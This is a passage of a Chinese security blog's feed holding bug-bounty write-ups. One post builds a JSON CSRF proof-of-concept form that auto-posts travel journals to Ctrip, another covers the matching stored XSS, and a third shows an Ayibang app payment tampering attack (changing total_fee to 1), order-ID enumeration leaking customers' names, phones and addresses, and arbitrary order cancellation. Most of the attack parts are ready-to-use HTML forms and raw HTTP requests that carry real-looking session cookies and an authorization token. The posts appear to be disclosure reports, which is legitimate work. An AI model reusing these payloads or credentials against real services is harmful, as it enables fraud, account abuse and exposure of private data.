class="attr">value</span>=<span class="string">'love rice"&#125;'</span> <span class="attr">type</span>=<span class="string">'hidden'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="在浏览器打开此Poc"><a href="#在浏览器打开此Poc" class="headerlink" title="在浏览器打开此Poc"></a>在浏览器打开此<code>Poc</code></h4><p><img src="http://static.zybuluo.com/1kbfree/470vyzkxjxp23fyi7646hz7y/image_1cgh4r1rh15671iempn1e5312om.png" alt="image_1cgh4r1rh15671iempn1e5312om.png-33.8kB"></p><p>查看一下是否真的发布成功~</p><p><img src="http://static.zybuluo.com/1kbfree/wtblno93qds3vqfwhw3ob8zv/image_1cgh4sfstr0m12lu1tee65f1e6h2j.png" alt="image_1cgh4sfstr0m12lu1tee65f1e6h2j.png-176kB"></p><p>接着我们点击编辑，查看是否会触发<code>Xss</code></p><p><img src="http://static.zybuluo.com/1kbfree/ugellf0ep7tyrfscqchmyn4v/image_1cgh4tdcv1osnph9mhrrl14oo30.png" alt="image_1cgh4tdcv1osnph9mhrrl14oo30.png-205.2kB"></p><p>ok~</p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;声明：内部文章,禁止转载!&lt;/p&gt;
&lt;p&gt;继上篇 &lt;code&gt;携程某处存在Json格式的Csrf漏洞发游记&lt;/code&gt; 写完后，又挖到一个 &lt;code&gt;Xss&lt;/code&gt; (某大佬提醒的),然后造成了组合拳~&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/Web%E6%94%BB%E9%98%B2/"/>
    
      <category term="渗透测试" scheme="127.0.0.1/categories/Web%E6%94%BB%E9%98%B2/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="作者(Iamfree)" scheme="127.0.0.1/categories/Web%E6%94%BB%E9%98%B2/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BD%9C%E8%80%85-Iamfree/"/>
    
    
      <category term="漏洞挖掘" scheme="127.0.0.1/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="Json Csrf" scheme="127.0.0.1/tags/Json-Csrf/"/>
    
      <category term="存储Xss" scheme="127.0.0.1/tags/%E5%AD%98%E5%82%A8Xss/"/>
    
      <category term="Web漏洞组合拳" scheme="127.0.0.1/tags/Web%E6%BC%8F%E6%B4%9E%E7%BB%84%E5%90%88%E6%8B%B3/"/>
    
  </entry>
  
  <entry>
    <title>携程某处存在Json格式的Csrf漏洞发游记</title>
    <link href="127.0.0.1/2018/06/21/%E6%90%BA%E7%A8%8B%E6%9F%90%E5%A4%84%E5%AD%98%E5%9C%A8Csrf%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%B8%B8%E8%AE%B0/"/>
    <id>127.0.0.1/2018/06/21/携程某处存在Csrf漏洞发游记/</id>
    <published>2018-06-21T11:13:28.000Z</published>
    <updated>2018-07-10T08:27:57.016Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>内部文章，禁止转载</p></blockquote><a id="more"></a><blockquote><p>URL -&gt; <a href="http://you.ctrip.com/members/47A3D55C158041BD8D7F21A7BA084AA1/journals" target="_blank" rel="noopener">http://you.ctrip.com/members/47A3D55C158041BD8D7F21A7BA084AA1/journals</a></p></blockquote><h4 id="1-打开URL后，页面如图"><a href="#1-打开URL后，页面如图" class="headerlink" title="1. 打开URL后，页面如图"></a>1. 打开URL后，页面如图</h4><p><img src="http://static.zybuluo.com/1kbfree/p6gljipfdvxyi9nqklpfywuf/image_1cggtjqgn2r21dlc128812gu1u849.png" alt="image_1cggtjqgn2r21dlc128812gu1u849.png-358.9kB"></p><h4 id="2-点击上图的写游记"><a href="#2-点击上图的写游记" class="headerlink" title="2. 点击上图的写游记"></a>2. 点击上图的写游记</h4><p><img src="http://static.zybuluo.com/1kbfree/j11j045f8xz72nmpw04kvvrd/image_1cggtlmfhq3l50r8in147aifum.png" alt="image_1cggtlmfhq3l50r8in147aifum.png-146.8kB"><br><em>点击后会进入另一个页面，如下图</em></p><h4 id="3-点击发布"><a href="#3-点击发布" class="headerlink" title="3. 点击发布"></a>3. 点击发布</h4><p><img src="http://static.zybuluo.com/1kbfree/7md936r409zlyh8ss369f99o/image_1cggtnrtg4h315d2174oi771rm413.png" alt="image_1cggtnrtg4h315d2174oi771rm413.png-80.9kB"><br><em>又又又还有一个页面</em></p><h4 id="4-选好后点击提交并且抓包"><a href="#4-选好后点击提交并且抓包" class="headerlink" title="4. 选好后点击提交并且抓包"></a>4. 选好后点击提交并且抓包</h4><p><img src="http://static.zybuluo.com/1kbfree/otd02a8z2x31i1j2udrolgco/image_1cggtquogas41v4c7keeju1p7p1g.png" alt="image_1cggtquogas41v4c7keeju1p7p1g.png-99.4kB"></p><p>抓取的数据包如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /TravelSite/Member/SaveNewTravel HTTP/1.1</span><br><span class="line">Host: you.ctrip.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://you.ctrip.com/TravelSite/Member/EditNewTravel?travelId=3689394</span><br><span class="line">Content-Length: 519</span><br><span class="line">Cookie: _bfa=1.1529559162771.3aowri.1.1529564159709.1529575803710.3.105; adscityen=Meizhou; _RF1=120.239.228.99; _RSG=T6KJObxFMeEUqcn7NtwLW8; _RDG=2885568a6cac882bb818690bc2de21a339; _RGUID=ea163fb9-584d-419d-8815-eb75c7c66d1e; _jzqco=%7C%7C%7C%7C1529559191059%7C1.113394883.1529559190871.1529565815866.1529576375632.1529565815866.1529576375632.undefined.0.0.20.20; __zpspc=9.3.1529576375.1529576375.1%234%7C%7C%7C%7C%7C%23; MKT_Pagesource=PC; _bfi=p1%3D290606%26p2%3D290606%26v1%3D105%26v2%3D104; login_uid=92A18FCF669DF32698BF54DD2CE7E1D1; login_type=0; UUID=1508E76B015E4E609698BCA0B9CA2320; IsPersonalizedLogin=F; appFloatCnt=1; manualclose=1; ASP.NET_SessionSvc=MTAuOC4xODkuNjB8OTA5MHxqaW5xaWFvfGRlZmF1bHR8MTUyNjUzNzExNDI2Mw; bdshare_firstime=1529559824392; _abtest_userid=a62eb7c0-4054-48fa-8421-eaae213957d6; cticket=1C81168DBA3550FFB18DE9387721086AA1AB2E3206164EF5DE4BF207D9F2AE8E; ticket_ctrip=bJ9RlCHVwlu1ZjyusRi+ypZ7X2r4+yojO82DkiXyGYeP0Mg96gJEQ+LWMo18plOrPdkAeXYih6tqb1Y94QwsvBuemHYmTAK0dmQ8i4jhcqKYiDhbXtS6b1594tYlhp4+VrZJoGlAq59Sa38eZFCT3+EpL6sqTuRUM54pmZHcxmxbT82oGUQF+6luF9/OQHCxD8ehHHp4AyfgBbwPE8WZTr6KEJYMAnGc5VDEoyGx91d2l+3B3eOk3Y2gGeR7BJbvn2PtKP3/2CZEUX0mKtoYQ5utvxMGO5R+fKJN1MMgSTw=; AHeadUserInfo=VipGrade=0&amp;UserName=&amp;NoReadMessageCount=0; DUID=u=08F36DBB6DC5886589DDBB5100AD9461&amp;v=0; IsNonUser=F; ASP.NET_SessionId=tcktpejhlxfokmlnf1q1zn3j; _bfs=1.7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;Content&quot;:&quot;&lt;p&gt;1111111111&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br/&gt;&lt;/p&gt;&quot;,&quot;Title&quot;:&quot;11111&quot;,&quot;UploadPicContent&quot;:&quot;&quot;,&quot;CoverImageId&quot;:0,&quot;TravelId&quot;:&quot;3689394&quot;,&quot;CoverLocationY&quot;:0,&quot;ClassifiedInfo&quot;:&#123;&quot;DistrictList&quot;:[&#123;&quot;DistrictId&quot;:&quot;110000&quot;,&quot;DistrictName&quot;:&quot;ä¸­å½ï¼äºæ´²&quot;,&quot;IsSelected&quot;:true&#125;,&#123;&quot;DistrictId&quot;:&quot;1&quot;,&quot;DistrictName&quot;:&quot;åäº¬ï¼ä¸­å½&quot;,&quot;IsSelected&quot;:true&#125;],&quot;TagList&quot;:[],&quot;TravelId&quot;:&quot;3689394&quot;,&quot;ClassifiedType&quot;:6,&quot;TravelDays&quot;:1111111111111,&quot;DepartureDate&quot;:&quot;2018-06-13&quot;,&quot;Consume&quot;:111,&quot;CompanionType&quot;:1&#125;,&quot;PublishStatus&quot;:1&#125;</span><br></pre></td></tr></table></figure></p><p><em>可以看到这里是由 <code>Json</code> 传递的，并且没有 <code>Token</code> 之类的验证，那么就可能会存在 <code>Csrf</code></em> </p><h4 id="5-我们将其构造成-Csrf-Poc"><a href="#5-我们将其构造成-Csrf-Poc" class="headerlink" title="5. 我们将其构造成 Csrf Poc"></a>5. 我们将其构造成 <code>Csrf Poc</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://you.ctrip.com/TravelSite/Member/SaveNewTravel"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"text/plain"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">'&#123;"Content":"&lt;p&gt;1111111111&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br/&gt;&lt;/p&gt;","Title":"11111","UploadPicContent":"","CoverImageId":0,"TravelId":"3689394","CoverLocationY":0,"ClassifiedInfo":&#123;"DistrictList":[&#123;"DistrictId":"110000","DistrictName":"涓浗锛屼簹娲�","IsSelected":true&#125;,&#123;"DistrictId":"1","DistrictName":"鍖椾含锛屼腑鍥�","IsSelected":true&#125;],"TagList":[],"TravelId":"3689394","ClassifiedType":6,"TravelDays":1111111111111,"DepartureDate":"2018-06-13","Consume":111,"CompanionType":1&#125;,"PublishStatus":1'</span> <span class="attr">value</span>=<span class="string">'"&#125;'</span> <span class="attr">type</span>=<span class="string">'hidden'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h5><p>很多人会问<code>Csrf Poc</code>数据包中的如下代码是干嘛的:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;PublishStatus&quot;:1&apos; value=&apos;&quot;&#125;&apos;</span><br></pre></td></tr></table></figure></p><p>那么下面我就来解答一下~</p><h6 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h6><p>我们打开这个构造好的<code>Csrf Poc</code>，并且抓包。</p><p><img src="http://static.zybuluo.com/1kbfree/bg5tze0r4ilxfnyk4hx2zqs1/image_1cggulta21htoq8d1q47dqm12nc1t.png" alt="image_1cggulta21htoq8d1q47dqm12nc1t.png-161.4kB"></p><p>可以看到，这里会多出一个<code>=</code>号，这是为什么呢？我就不拐弯抹角了，看如下案例。</p><h6 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h6><p>创建一个<code>1.html</code>文件，代码如下:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>iamfree<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"https://www.baidu.com"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"value"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们在浏览器打开这个<code>html</code>文件并且抓包~</p><p><img src="http://static.zybuluo.com/1kbfree/hzrjgza3ogjghpkbdxwlxp4a/image_1cggv215618qv1c332bsaufrse2a.png" alt="image_1cggv215618qv1c332bsaufrse2a.png-113kB"></p><blockquote><p>看到这里的 <code>=</code> 号了吗，也就是说但我们在设置一个 <code>input</code> 属性的时候,会将<code>name</code>的值和<code>value</code>的值以一个等于号的形式传递，所以说上面我们构造好的<code>Csrf Poc</code>就是为了将这个<code>=</code>号放在数据里面，否则传递的<code>Json</code>会报错~</p></blockquote><h4 id="6-浏览器处打开这个Poc"><a href="#6-浏览器处打开这个Poc" class="headerlink" title="6. 浏览器处打开这个Poc"></a>6. 浏览器处打开这个Poc</h4><p><img src="http://static.zybuluo.com/1kbfree/jec1gasck1j6t5ns9dyyve3e/image_1cggvbjp914dp14bt1mec1j0r15vi2n.png" alt="image_1cggvbjp914dp14bt1mec1j0r15vi2n.png-32kB"></p><p><img src="http://static.zybuluo.com/1kbfree/a3m0bhbmy7ximhww0y1rkas3/image_1cggvcoam1i5h3q4njf1sf41a3034.png" alt="image_1cggvcoam1i5h3q4njf1sf41a3034.png-46.6kB"></p><p>我们确认一下是否可以发布</p><p><img src="http://static.zybuluo.com/1kbfree/ykureziocu1mytqfp1b16wm9/image_1cggve0kq18quhsf1j4al8hfi4h.png" alt="image_1cggve0kq18quhsf1j4al8hfi4h.png-330.1kB"></p><p><em>可以看到并没有发布，这其中肯定有猫腻，我们再继续分析一波</em></p><h4 id="7-分析异常"><a href="#7-分析异常" class="headerlink" title="7. 分析异常"></a>7. 分析异常</h4><p><img src="http://static.zybuluo.com/1kbfree/57mwvrqtms0a7zrmawc0dflg/image_1cggvl77q79isqk1l4di5ts0u4u.png" alt="image_1cggvl77q79isqk1l4di5ts0u4u.png-129.2kB"></p><h4 id="8-异常处理"><a href="#8-异常处理" class="headerlink" title="8. 异常处理"></a>8. 异常处理</h4><blockquote><p>异常分析后修改的<code>Csrf Poc</code>如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://you.ctrip.com/TravelSite/Member/SaveNewTravel"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"text/plain"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">'&#123;"Content":"&lt;p&gt;1111111111&lt;/p&gt;","UploadPicContent":"","CoverImageId":0,"TravelId":"3689394","CoverLocationY":0,"ClassifiedInfo":&#123;"DistrictList":[&#123;"DistrictId":"110000","DistrictName":"涓浗锛屼簹娲�","IsSelected":true&#125;,&#123;"DistrictId":"1","DistrictName":"鍖椾含锛屼腑鍥�","IsSelected":true&#125;],"TagList":[],"TravelId":"3689394","ClassifiedType":6,"TravelDays":1111111111,"DepartureDate":"2018-06-13","Consume":111,"CompanionType":1&#125;,"PublishStatus":1,"Title":"1111'</span> <span class="attr">value</span>=<span class="string">'"&#125;'</span> <span class="attr">type</span>=<span class="string">'hidden'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><h4 id="9-在浏览器处打开此POC"><a href="#9-在浏览器处打开此POC" class="headerlink" title="9. 在浏览器处打开此POC"></a>9. 在浏览器处打开此POC</h4><p><img src="http://static.zybuluo.com/1kbfree/knjs1crgvnkuduke1akrzii8/image_1cgh0lpg61nhdgll1aqj1a3h1f0t78.png" alt="image_1cgh0lpg61nhdgll1aqj1a3h1f0t78.png-28.3kB"></p><p><img src="http://static.zybuluo.com/1kbfree/1nil8f18impk1tdhrbjynau8/image_1cgh0mh7sh7ujg710vt1uhc1sd47l.png" alt="image_1cgh0mh7sh7ujg710vt1uhc1sd47l.png-309.5kB"></p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;内部文章，禁止转载&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Web攻防" scheme="127.0.0.1/categories/Web%E6%94%BB%E9%98%B2/"/>
    
      <category term="渗透测试" scheme="127.0.0.1/categories/Web%E6%94%BB%E9%98%B2/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="作者(Iamfree)" scheme="127.0.0.1/categories/Web%E6%94%BB%E9%98%B2/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BD%9C%E8%80%85-Iamfree/"/>
    
    
      <category term="漏洞挖掘" scheme="127.0.0.1/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="Json Csrf" scheme="127.0.0.1/tags/Json-Csrf/"/>
    
  </entry>
  
  <entry>
    <title>腾讯某处SSRF漏洞</title>
    <link href="127.0.0.1/2018/06/16/%E8%85%BE%E8%AE%AF%E6%9F%90%E5%A4%84SSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>127.0.0.1/2018/06/16/腾讯某处SSRF漏洞/</id>
    <published>2018-06-16T09:50:20.000Z</published>
    <updated>2018-06-16T09:50:20.904Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;blockquote class=&quot;blockquote-center&quot;&gt;&lt;p&gt;十年寒窗无人问，一举成名天下知&lt;br&gt;                            – Cai_Team&lt;/p&gt;
&lt;/blockquote&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>阿姨帮最新APP漏洞大全(支付漏洞/地址/订单遍历/删除等)</title>
    <link href="127.0.0.1/2018/06/16/%E9%98%BF%E5%A7%A8%E5%B8%AE%E6%9C%80%E6%96%B0APP%E6%BC%8F%E6%B4%9E%E5%A4%A7%E5%85%A8/"/>
    <id>127.0.0.1/2018/06/16/阿姨帮最新APP漏洞大全/</id>
    <published>2018-06-16T09:39:01.000Z</published>
    <updated>2018-06-16T09:47:52.338Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>危害：看文章自己脑补<br>漏洞等级：高<br>提交时间：   2016-02-02 12:45</p></blockquote><a id="more"></a>    <h3 id="简要描述："><a href="#简要描述：" class="headerlink" title="简要描述："></a>简要描述：</h3><p>阿姨帮最新版APP(v6.2.0)漏洞打包</p><h3 id="详细说明："><a href="#详细说明：" class="headerlink" title="详细说明："></a>详细说明：</h3><h4 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h4><h5 id="1-超低价格支付订单"><a href="#1-超低价格支付订单" class="headerlink" title="1. 超低价格支付订单"></a>1. 超低价格支付订单</h5><p>点击首页，随便选择一项服务并下订单</p><p><img src="http://static.zybuluo.com/1kbfree/nwywtw101sydlcvxyun0xxu5/image_1cg3udg33qk4cgk6f64krptq9.png" alt="image_1cg3udg33qk4cgk6f64krptq9.png-62.5kB"></p><p><img src="http://static.zybuluo.com/1kbfree/og7jbdinrgav66gvtqjcohfy/image_1cg3ufnh119mf1a2a1edf5vbjum.png" alt="image_1cg3ufnh119mf1a2a1edf5vbjum.png-78.7kB"></p><h5 id="2-点击确认支付抓包并先截断提交："><a href="#2-点击确认支付抓包并先截断提交：" class="headerlink" title="2. 点击确认支付抓包并先截断提交："></a>2. 点击确认支付抓包并先截断提交：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST https://api-cust.ayibang.com/v1/pay/wx/sign HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34</span><br><span class="line">Network: WiFi</span><br><span class="line">City: beijing</span><br><span class="line">Timestamp: 1452845167007</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Content-Length: 128</span><br><span class="line">out_trade_no=11291191&amp;attach=0_1_13800000000_0&amp;body=%E9%98%BF%E5%A7%A8%E5%B8%AE%E6%94%AF%E4%BB%98&amp;total_fee=5000&amp;trade_type=AP</span><br></pre></td></tr></table></figure><p><em>将上面的total_fee的值改为1，提交</em></p><p><img src="http://static.zybuluo.com/1kbfree/1r7oj128q2miz6cc0q1y66ik/image_1cg3ul0q0178ondf136n1bklbpj13.png" alt="image_1cg3ul0q0178ondf136n1bklbpj13.png-38.2kB"></p><p><em>支付成功后订单成为待确认状态，说明支付成功</em></p><p><img src="http://static.zybuluo.com/1kbfree/uv9e3uhr4itz91mlaqkjp4hw/image_1cg3ulbjk776vs8imhrn34kd1g.png" alt="image_1cg3ulbjk776vs8imhrn34kd1g.png-47.3kB"></p><h4 id="任意用户订单查看"><a href="#任意用户订单查看" class="headerlink" title="任意用户订单查看"></a>任意用户订单查看</h4><p>点击我们刚生成的订单，系统访问如下地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET https://api-cust.ayibang.com/v1/order/detail?orderID=11291191 HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34</span><br><span class="line">Network: WiFi</span><br><span class="line">City: beijing</span><br><span class="line">Timestamp: 1452845324989</span><br><span class="line">Host: api-cust.ayibang.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br></pre></td></tr></table></figure><p><em>orderID=11291191处可遍历，burp出手对订单的后四位遍历</em></p><p><img src="http://static.zybuluo.com/1kbfree/tarjvjo28tnq0almee667dqm/image_1cg3untagce0og8n901nln75e1t.png" alt="image_1cg3untagce0og8n901nln75e1t.png-212.4kB"></p><p>N多订单信息可看</p><p><img src="http://static.zybuluo.com/1kbfree/iu8l9ftbkxioegspg7psf7bz/image_1cg3uo8rl1o5ii0p3kfrq8117h2a.png" alt="image_1cg3uo8rl1o5ii0p3kfrq8117h2a.png-282.2kB"></p><p><em>以订单ID为11290071为例，可查看到该订单涉及用户的姓名 手机号 住址等</em></p><p><img src="http://static.zybuluo.com/1kbfree/mzxfhiyt1fdrikeevmdw5tt7/image_1cg3uokl71f7b1um568d15kjcjs2n.png" alt="image_1cg3uokl71f7b1um568d15kjcjs2n.png-228.7kB"></p><h4 id="任意用户订单取消漏洞"><a href="#任意用户订单取消漏洞" class="headerlink" title="任意用户订单取消漏洞"></a>任意用户订单取消漏洞</h4><p>点击之前的订单，点击取消订单，会抓到如下请求包:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST https://api-cust.ayibang.com/v1/order/cancel HTTP/1.1</span><br><span class="line">User-Agent: &#123;&quot;os&quot;:&quot;4.4.2&quot;,&quot;unique&quot;:&quot;28552821044111528D2446FF003&quot;,&quot;version-Code&quot;:1012,&quot;version-Name&quot;:&quot;6.2.0&quot;,&quot;device&quot;:&quot;M355&quot;,&quot;sim-Operator&quot;:&quot;UnKnown&quot;,&quot;mac&quot;:&quot;28D2446FF003&quot;,&quot;type&quot;:&quot;Android&quot;,&quot;channel&quot;:&quot;portal&quot;&#125;</span><br><span class="line">Authorization: 30f6188161eb1a0bc7d245c49c01a208bb3cee34</span><br><span class="line">Network: WiFi</span><br><span class="line">City: beijing</span><br><span class="line">Timestamp: 1452846770206</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Host: 